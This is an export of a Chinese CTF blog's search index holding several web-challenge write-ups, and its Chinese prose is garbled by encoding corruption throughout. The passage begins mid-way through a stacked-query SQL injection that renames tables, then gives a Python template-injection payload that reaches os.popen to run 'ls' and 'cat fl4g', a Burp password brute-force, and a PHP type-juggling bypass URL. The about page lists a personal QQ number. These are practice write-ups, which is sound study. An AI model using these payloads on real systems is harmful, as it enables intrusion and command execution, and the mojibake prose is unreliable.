flagï¼Œè¯´æ˜ä¸åœ¨è¿™ä¸ªè¡¨ï¼Œè¿™ä»£è¡¨æˆ‘ä»¬è¦æ›¿æ¢è¡¨ï¼Œæ„é€ ï¼š<br>â€œ1â€™;show columns from `1919810931114514` #<br>å‘ç°äº† flagï¼š<br><img src="/2023/09/19/mysql-inject1/image5.jpg"><br>é‚£è¯´æ˜è¿™ä¸ªæŸ¥è¯¢è¯­å¥é»˜è®¤åœ¨è¡¨ word é‡Œï¼Œé¢˜ç›®ä¼¼ä¹æ²¡æœ‰ç¦ç”¨ rename å’Œ alterï¼Œæˆ‘ä»¬é‡‡å–æ›´æ”¹é¢„è®¾è¡¨çš„å½¢å¼æ¥è·å– flagï¼Œæ„é€ ï¼š<br>1â€™; rename tables `words` to `words1`; rename tables `1919810931114514` to `words`;<br>alter tables `words` change `flag` `id` varchar(100); #<br>å»æ›´æ”¹flag åœ¨çš„è¡¨ï¼Œå¹¶æŒ‰ç…§æ ¹æ®id çš„æ ¼å¼å»æ›´æ”¹ flagï¼Œè®©æŸ¥è¯¢è¯­å¥å¯¹ flag ç”Ÿæ•ˆï¼Œæ›´æ”¹åï¼Œæ„é€ ï¼š<br>1â€™ or 1&#x3D;1 #<br>æŸ¥è¯¢æ‰€æœ‰å†…å®¹å³å¯è·å–åˆ° flagã€‚<br><img src="/2023/09/19/mysql-inject1/image6.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL æ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€æ”»é˜²ä¸–ç•Œã€‘ easy_python æ¨¡æ¿æ³¨å…¥1</title>
      <link href="/2023/09/18/python-template1/"/>
      <url>/2023/09/18/python-template1/</url>
      
        <content type="html"><![CDATA[<h3 id="Python-æ¨¡æ¿æ³¨å…¥"><a href="#Python-æ¨¡æ¿æ³¨å…¥" class="headerlink" title="Python æ¨¡æ¿æ³¨å…¥"></a>Python æ¨¡æ¿æ³¨å…¥</h3><p>æ‹¿åˆ°é¢˜ç›®ï¼Œç›´æ¥å‘Šè¯‰æˆ‘ä»¬æ˜¯ python template é—®é¢˜ï¼Œä»¥ python æ¨¡æ¿æ³¨å…¥çš„è§’åº¦åˆ‡å…¥ã€‚<br>å¯¹äºå¾ˆå¤šç½‘ç«™ï¼Œä¸ºäº†æ–¹ä¾¿ï¼Œéƒ½ä¼šå¥—ç”¨ä¸€ä¸ª html æ¨¡æ¿ï¼Œæ¨¡æ¿ä¼šç»™ä¸€ä¸ªæ¥å£ï¼Œç”¨ python å°†è¿™æ®µä»£ç ä»¥ä½œä¸ºå˜é‡çš„å½¢å¼å¥—å…¥è¿›æ¨¡æ¿ã€‚<br>è¿™é‡Œçš„æ¨¡æ¿æ³¨å…¥å°±æ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è¿™ä¸ªå˜é‡é‡Œé¢æ³¨å…¥æˆ‘ä»¬æƒ³è¦çš„ä»£ç ï¼Œè·å–åˆ°ä¿¡æ¯ï¼Œæ³¨å…¥çš„æ—¶å€™ç”¨èŠ±æ‹¬å·â€œ{ {} }â€åŒ…è£¹ä½ codeã€‚æœ¬é¢˜ä¸­ï¼Œæˆ‘ä»¬æµ‹è¯•{ {1+5} }ï¼š<br><img src="/2023/09/18/python-template1/image1.jpg"><br>æœä¸å…¶ç„¶ï¼Œä»£ç æ‰§è¡Œäº†ï¼Œè¿”å›äº† 6ï¼Œæ¥ä¸‹æ¥è¿›è¡Œæ­£å¼çš„æ³¨å…¥ï¼Œå¸¸è§çš„æ³¨å…¥æ–¹æ³•æœ‰ä»¥ä¸‹å‡ ç§ï¼š<br>ä»¥ä¸‹æ‰€æœ‰çš„æ–¹æ³•å‡è¦è¢«â€œ__â€ åŒ…è£¹</p><ul><li>__class__ ï¼š è¿”å›å¯¹è±¡æ‰€å±çš„ç±»ã€‚</li><li>__mro__ : è¿”å›åŸºç±»å…ƒç»„ã€‚</li><li>__base__ï¼šè¿”å›åŸºç±»ã€‚</li><li>__subclasses__()[]ï¼šè¿”å›å­ç±»ã€‚</li><li>__init__ ï¼šåˆå§‹åŒ–ç±»ã€‚</li><li>__globals[]__ ï¼š å¯¹åŒ…å«å‡½æ•°å…¨å±€å˜é‡çš„å­—å…¸çš„å¼•ç”¨ï¼Œè¯´äººè¯å°±æ˜¯è°ƒç”¨å…¨å±€çš„åŒ…ï¼Œå¦‚â€™osâ€™ç­‰ã€‚</li></ul><p>åœ¨æ³¨å…¥ä¹‹åæˆ‘ä»¬é€šå¸¸ä½¿ç”¨ä¸¤ç§æ–¹æ³•æ¥æ“æ§æ§åˆ¶å°è·å–ä¿¡æ¯ï¼š</p><ul><li>os.popen(â€œfile_nameâ€) ï¼šè¿”å›æ–‡ä»¶å†…å®¹ã€‚</li><li>os.system ï¼š è¿”å›çŠ¶æ€ç ã€‚</li></ul><p>å¼€å§‹æ“ä½œï¼Œæ„é€  [].__class__.__mro__ å¹¶å‘é€ï¼š<br><img src="/2023/09/18/python-template1/image2.jpg"><br>å¯ä»¥çœ‹åˆ°è·å–åˆ°äº†ä¸¤ä¸ªåŸºç±»ï¼Œæˆ‘ä»¬é€‰ç”¨ mro[1] è·å–å…¶ä¸­ä¸€ä¸ªåŸºç±»ï¼Œç„¶åå†åœ¨è¿™ä¸ªåŸºç±»é‡Œé¢è°ƒå–ä»–æ‰€æœ‰å¯ç”¨çš„å­ç±»ï¼Œæ„é€  [].__class__.__mro__[1].__subclasses__() å‘é€ï¼Œè·å–åˆ°æ‰€æœ‰å­ç±»ï¼š<br><img src="/2023/09/18/python-template1/image3.jpg"><br>æˆ‘ä»¬è¦æ‰¾åˆ° os.popen çš„åŸºç±»site._Printerç±»ï¼Œç”¨å®ƒæ¥è°ƒç”¨ popenï¼Œå¯¹æ­¤ï¼Œæˆ‘ä»¬å…ˆè¦æ‰¾åˆ° site._Printeråœ¨subclasses ä¸­çš„ç´¢å¼•ï¼Œè°ƒç”¨ä»¥ä¸‹ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="string">&quot; &quot;</span>                  <span class="comment">#è¾“å…¥æ‰€æœ‰ subclasses å†…å®¹</span></span><br><span class="line">str_new = []</span><br><span class="line">sub_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">str</span>)):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span>[i]!=<span class="string">&quot;,&quot;</span> <span class="keyword">and</span> <span class="built_in">str</span>[i]!=<span class="string">&quot; &quot;</span>:</span><br><span class="line">        sub_str+=<span class="built_in">str</span>[i]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span>[i]==<span class="string">&#x27;,&#x27;</span>:</span><br><span class="line">        str_new.append(sub_str)</span><br><span class="line">        sub_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">result = str_new.index(<span class="string">&quot;&lt;class&#x27;site._Printer&#x27;&gt;&quot;</span>,<span class="number">0</span>,<span class="built_in">len</span>(<span class="built_in">str</span>))</span><br><span class="line">result</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è·å–åˆ°ç»“æœä¸º 71ï¼Œæˆ‘ä»¬å®šä½åˆ° subclasses ä¸­ç¬¬71 ä¸ªå…ƒç´ ï¼Œå¹¶åˆå§‹åŒ–è¿™ä¸ªç±»ï¼Œè°ƒç”¨ä»–çš„å…¨å±€å˜é‡ os ä¸‹çš„ popen å‡½æ•°ï¼Œè¿™é‡Œä½¿ç”¨â€˜lsâ€™æ¥æŸ¥çœ‹æ‰€æœ‰æ–‡ä»¶ã€‚<br>äºæ˜¯æ„é€  :<br>[].__class__.__mro__[1].__subclasses__()[71].__init__.__globals__[â€˜osâ€™].popen(â€˜lsâ€™).read()<br>è·å¾—ç»“æœï¼š<br><img src="/2023/09/18/python-template1/image4.jpg"><br>è¿™é‡Œç”¨ç©ºæ ¼éš”å¼€äº†å‡ ä¸ªæ–‡ä»¶ï¼Œå‘ç°äº†æœ‰fl4gæ–‡ä»¶ï¼Œæˆ‘ä»¬åœ¨ popen é‡Œä½¿ç”¨ cat fl4gå»è¯»ä»–é‡Œé¢çš„å†…å®¹(è®°å¾—è¦ç”¨%20 ä»£æ›¿ç©ºæ ¼ï¼Œä¸ç„¶ url ä¸ä¸€å®šåœ¨ safari æœ‰æ•ˆ)<br>[].__class__.__mro__[1].__subclasses__()[71].__init__.__globals__[â€˜osâ€™].popen(â€˜cat%20fl4gâ€™â€™).read()<br>å¾—åˆ° flagï¼š<br><img src="/2023/09/18/python-template1/image5.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssti </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€æ”»é˜²ä¸–ç•Œã€‘weak_auth å¯†ç çˆ†ç ´</title>
      <link href="/2023/09/18/easy-blast/"/>
      <url>/2023/09/18/easy-blast/</url>
      
        <content type="html"><![CDATA[<h3 id="ç®€å•å¯†ç çˆ†ç ´"><a href="#ç®€å•å¯†ç çˆ†ç ´" class="headerlink" title="ç®€å•å¯†ç çˆ†ç ´"></a>ç®€å•å¯†ç çˆ†ç ´</h3><p>æ‰“å¼€é¢˜ç›®åï¼Œçœ‹åˆ°ä¸€ä¸ªç™»å½•é¡µé¢.<br><img src="/2023/09/18/easy-blast/image1.jpg"><br>æˆ‘ä»¬å…ˆéšæœºè¾“å…¥ä¸€äº›ä¸œè¥¿è¿›å»ï¼Œçœ‹çœ‹æ•ˆæœï¼š<br><img src="/2023/09/18/easy-blast/image2.jpg"><br>çœ‹åˆ° login as adminï¼Œæˆ‘ä»¬å°†ç”¨æˆ·åæ”¹ä¸º admin åï¼Œå‘ç°å¼¹å‡ºçª—å£ä¸ä¸€æ ·ã€‚äºæ˜¯å°±é”å®šäº†ç”¨æˆ·åæ˜¯ adminï¼Œç„¶åå¯¹å¯†ç è¿›è¡Œçˆ†ç ´ã€‚<br>ä½¿ç”¨ burp è¿›è¡Œçˆ†ç ´ï¼Œé€‰ç”¨çˆ†ç ´å­—å…¸ï¼Œæ›´æ”¹å‚æ•°ï¼š<br><img src="/2023/09/18/easy-blast/image3.jpg"><br><img src="/2023/09/18/easy-blast/image4.jpg"><br>è¿›è¡Œçˆ†ç ´åæˆ‘ä»¬å‘ç°ï¼Œå¯†ç â€œ123456â€è·å–åˆ°çš„å“åº”åŒ…çš„é•¿åº¦æ˜¾è‘—ä¸åŒï¼Œç‚¹å¼€æŸ¥çœ‹åï¼Œå‘ç°å·²ç»æˆåŠŸç™»å½•å¹¶è·å–åˆ° flagã€‚<br><img src="/2023/09/18/easy-blast/image5.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> çˆ†ç ´ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€æ”»é˜²ä¸–ç•Œã€‘simplePHP PHPä»£ç å®¡è®¡</title>
      <link href="/2023/09/16/artical-simplephp/"/>
      <url>/2023/09/16/artical-simplephp/</url>
      
        <content type="html"><![CDATA[<h3 id="EASY-PHPæ¼æ´"><a href="#EASY-PHPæ¼æ´" class="headerlink" title="EASYã€€PHPæ¼æ´"></a>EASYã€€PHPæ¼æ´</h3><p>æ‰“å¼€ simplephp è¿™é“é¢˜æˆ‘ä»¬æ‹¿åˆ°çš„ä¿¡æ¯ã€‚<br><img src="/2023/09/16/artical-simplephp/image_question.jpg"><br>é¦–å…ˆæ˜¯å¯ä»¥çœ‹åˆ°ä»£ç ä¸­æœ‰ä¸¤ä¸ª GETï¼Œè¯´æ˜è¿™é“é¢˜å¯ä»¥é€šè¿‡æ„é€  url GETè¯·æ±‚æ¥æ¸—é€ã€‚<br>ä»£ç ä¸­å‡ºç°äº†â€&#x3D;&#x3D;â€ï¼Œè¿™ä¸ªåœ¨ php ä¸­æ˜¯å¼±ç±»å‹æ¯”è¾ƒï¼Œå¼±ç±»å‹æ¯”è¾ƒä¸â€œ&#x3D;&#x3D;&#x3D;â€ä¸åŒï¼Œä¸ä¼šè¦æ±‚ä»–ä»¬æ ¼å¼ä¹Ÿç›¸åŒï¼Œè€Œæ˜¯ä¼šå…ˆå°†ä¸¤ä¸ªä¸åŒæ ¼å¼çš„å˜é‡è½¬æ¢ä¸ºç›¸åŒæ ¼å¼å†æ¯”è¾ƒï¼Œå¯¹äºâ€œ$a&#x3D;&#x3D;0&amp;&amp;aâ€æˆ‘ä»¬å¯ä»¥é€šè¿‡æ„é€  0 çš„ url ç¼–ç æ¥ç»•è¿‡ï¼Œé¦–å…ˆ GET è¯·æ±‚çš„æ—¶å€™ä¼šå…ˆä¸€æ¬¡è§£ç ï¼Œæ‰€ä»¥è¿™é‡Œçš„ 0 æˆ‘ä»¬è¦äºŒæ¬¡ç¼–ç ï¼Œç¼–ç æˆ%2530ï¼Œç„¶ååœ¨&#x3D;&#x3D;è¿™é‡Œä¼šè½¬æ¢æˆ 0 é€šè¿‡ï¼Œåœ¨åˆ¤ a ä¸ºçœŸè¿™é‡Œä¹Ÿä¼šé€šè¿‡ï¼Œå› ä¸ºä¸ä¼šè½¬æ¢ç±»å‹ã€‚<br>å¯¹äº b çš„æ„é€ ï¼Œè¦æ±‚å…¶å¤§äº 1234ï¼Œé¦–å…ˆå…ˆæ¥äº†è§£ php ä¸­çš„å„ç±»å‹è½¬æ¢ï¼š<br>string -&gt; intï¼Œä¼šæ‰”æ‰é™¤äº† int ç±»å‹ä»¥å¤–çš„æ‰€æœ‰ç¬¦å·ï¼Œåœ¨ php æ¯”è¾ƒé‡Œé¢ä¹Ÿæ˜¯è¿™æ ·ï¼Œæ¯”å¦‚æ‹¿å­—ç¬¦ä¸²å’Œ int ç±»å‹åšæ¯”è¾ƒï¼Œä¼šå¯¼è‡´å­—ç¬¦ä¸²ç±»å‹è¿‡æ»¤æ‰é™¤äº† int ä»¥å¤–çš„ï¼Œæ‰€ä»¥ä¸èƒ½æ¯”è¾ƒ ascii ç ã€‚<br>ä»¥æ­¤ç±»æ¨ï¼Œä¼šè½¬æ¢æˆè¢«å¯¹æ¯”å¯¹è±¡çš„æ ¼å¼ï¼Œå…¶ä»–æ ¼å¼ä¸€å¾‹æ¸…é™¤ã€‚<br>php ä»£ç ï¼š<br><img src="/2023/09/16/artical-simplephp/image_code.jpg"><br>ç»“æœï¼š<br><img src="/2023/09/16/artical-simplephp/image_result.jpg"><br>æ‰€ä»¥åœ¨è¿™é‡Œï¼Œb é‚£è¾¹æœ‰ä¸ªåˆ¤æ–­æ˜¯å¦æ˜¯æ•°å­—ç±»å‹çš„å‡½æ•°ï¼Œæˆ‘ä»¬éœ€è¦ç»•è¿‡è¿™ä¸ªå‡½æ•°ï¼Œæ‰€ä»¥å¿…é¡»æ˜¯å­—ç¬¦ä¸²å½¢å¼ï¼Œåˆè¦è¦æ±‚å¤§äº 1234ï¼Œäºæ˜¯æˆ‘ä»¬æ„é€  b&#x3D;1235a ï¼ˆå‰é¢çš„æ•°å­—æ¯” 1234 å¤§ï¼‰å³å¯ã€‚<br>å¯¹äºæ­¤é¢˜ï¼Œæˆ‘ä»¬æ„é€ ï¼š<br>&#x2F;?a&#x3D;a&#x3D;%2530&amp;&amp;b&#x3D;%34%34%34%34%41 å³å¯è·å¾— flagã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€æ”»é˜²ä¸–ç•Œã€‘robotstxt</title>
      <link href="/2023/09/15/robotstxt/"/>
      <url>/2023/09/15/robotstxt/</url>
      
        <content type="html"><![CDATA[<h2 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h2><p>robots.txt æ–‡ä»¶æ˜¯ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼Œä½¿ç”¨ä»»ä½•ä¸€ä¸ªå¸¸è§çš„æ–‡ æœ¬ç¼–è¾‘å™¨ï¼Œæ¯”å¦‚ Windows ç³»ç»Ÿè‡ªå¸¦çš„ Notepadï¼Œå°±å¯ä»¥åˆ›å»ºå’Œç¼–è¾‘å®ƒã€‚robots.txt æ˜¯ä¸€ä¸ªåè®®ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªå‘½ä»¤ã€‚ robots.txt æ˜¯æœç´¢å¼•æ“ä¸­è®¿é—®ç½‘ç«™çš„æ—¶å€™è¦æŸ¥çœ‹çš„ç¬¬ä¸€ä¸ª æ–‡ä»¶ã€‚robots.txt æ–‡ä»¶å‘Šè¯‰èœ˜è››ç¨‹åºåœ¨æœåŠ¡å™¨ä¸Šä»€ä¹ˆæ–‡ä»¶ æ˜¯å¯ä»¥è¢«æŸ¥çœ‹çš„ã€‚</p><h2 id="ç”¨é€”"><a href="#ç”¨é€”" class="headerlink" title="ç”¨é€”"></a>ç”¨é€”</h2><p>robots.txt å¸¸ç”¨äºè¿‡æ»¤æ‰ä¸å¸Œæœ›æœç´¢å¼•æ“èƒ½æœç´¢å‡ºæ¥çš„æ–‡ä»¶ï¼Œè¿™ç§æ–‡ä»¶å¸¸å¸¸æ˜¯æ•æ„Ÿçš„ï¼Œæœ¬ä½“ä¸­ï¼Œå¦‚ä¸‹ï¼š<br><img src="/2023/09/15/robotstxt/image1.jpg"><br>åœ¨è·å–åˆ°&#x2F;fl0g.phpçš„ä¿¡æ¯åï¼Œæ”¾åœ¨urlé‡Œ get è¯·æ±‚å³å¯è·å–åˆ° flagã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> robots.txt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>about</title>
      <link href="/2023/09/15/about/"/>
      <url>/2023/09/15/about/</url>
      
        <content type="html"><![CDATA[<h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><h2 id="å…³äºåšå®¢"><a href="#å…³äºåšå®¢" class="headerlink" title="å…³äºåšå®¢"></a>å…³äºåšå®¢</h2><p>è¿™æ˜¯ä¸€ä¸ªç”¨äºè®°å½•å­¦ä¹ ç¬”è®°çš„åšå®¢ï¼ŒåŒ…æ‹¬æ—¥å¸¸å­¦ä¹ å’Œç»ƒä¹ é¢˜ï¼Œæ¯”èµ›èµ›é¢˜çš„ WriteUpã€‚</p><h2 id="å…³äºæˆ‘"><a href="#å…³äºæˆ‘" class="headerlink" title="å…³äºæˆ‘"></a>å…³äºæˆ‘</h2><p>ä¸­å±±å¤§å­¦è½¯ä»¶å·¥ç¨‹å­¦é™¢å­¦ç”Ÿ&#x2F;CTFer Web æ–¹å‘&#x2F;éŸ³æ¸¸ç©å®¶<br>æˆ‘çš„ QQï¼š1789697833<br>æ¬¢è¿æ¥æ‰¾æˆ‘ç©ï¼</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
